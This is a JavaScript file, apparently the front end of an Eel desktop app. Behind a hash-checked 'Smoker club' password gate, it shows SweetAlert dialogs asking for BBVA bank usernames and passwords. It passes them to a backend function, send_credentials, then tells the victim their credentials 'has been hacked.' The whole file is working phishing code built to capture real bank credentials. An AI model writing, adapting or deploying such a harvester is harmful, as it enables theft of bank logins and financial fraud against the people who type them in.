function password(){
    Swal.fire({
        title: 'Smoke!',
        text: 'The only ones who thought this wouldn\'t be smoke will pass by.',
        background: "#000",
        imageUrl: 'https://media.giphy.com/media/tKx3Fcc1vv9BhDMMjw/giphy.gif',
        imageWidth: 311,
        imageHeight: 480,
        imageAlt: 'Custom image',
        allowOutsideClick: false,
        allowEscapeKey: false,
        allowEnterKey: false,
        showConfirmButton: true,
        confirmButtonColor:"#000",
        confirmButtonClass:"confirmButtonClass",
        confirmButtonText: "",
        animation: false
    }).then((result) => {
        Swal.fire({
            title: 'Smoker club',
            text:"Enter your smoke code, brother",
            input: 'password',
            inputPlaceholder: 'Smoker key',
            background: "#000",
            imageUrl: 'https://media.giphy.com/media/tKx3Fcc1vv9BhDMMjw/giphy.gif',
            imageWidth: 311,
            imageHeight: 480,
            imageAlt: 'Custom image',
            allowOutsideClick: false,
            allowEscapeKey: false,
            allowEnterKey: false,
            showCancelButton: false,
            confirmButtonText: "Get in",
            inputAttributes: {
                maxlength: 100,
                autocapitalize: 'off',
                autocorrect: 'off'
            },
            inputValidator: async (value) => {
                // TODO check password
                if (sha256(value) !== '830e0d1c621a94b7c3b7495f1323c25ae516c8eaf5a486949514599d1d1472d6'){
                    window.close();
                } else {
                    eel.check_password(value);
                }
            }
        })
    .then((result) => {
        Swal.fire({
        title: 'Enter your BBVA credentials',
        text:"BBVA username: XEXXXXX or E0XXXX",
        input: 'text',
        inputPlaceholder: 'XEXXXXXX',
        showCancelButton: false,
        confirmButtonText: "Next",
        allowOutsideClick: false,
        allowEscapeKey: false,
        allowEnterKey: false,
        inputValidator: (value) => {
            if (!value || value === "") {
                return 'You need to write something!'
            }
        }
    }).then((user) => {
        if (user.value) {
            username = user;
            Swal.fire({
                title: 'Enter your BBVA credentials',
                text:"BBVA password: 123456789 or password",
                input: 'password',
                inputPlaceholder: 'Password',
                showCancelButton: false,
                confirmButtonText: "Next",
                allowOutsideClick: false,
                allowEscapeKey: false,
                allowEnterKey: false,
                inputAttributes: {
                    maxlength: 8,
                    autocapitalize: 'off',
                    autocorrect: 'off'
                },
                inputValidator: (value) => {
                    if (!value) {
                        return 'You need to write something!'
                    }
                }
            })
            .then((password) => {
                if (password.value) {
                    eel.send_credentials(username["value"], password["value"]);
                    Swal.fire({
                        title: 'Nice!',
                        text: 'Your credentials has been hacked.',
                        type: 'success',
                        showConfirmButton: false,
                        timer: 3000
                    })
                }
            })

        }
    })
    })})
}
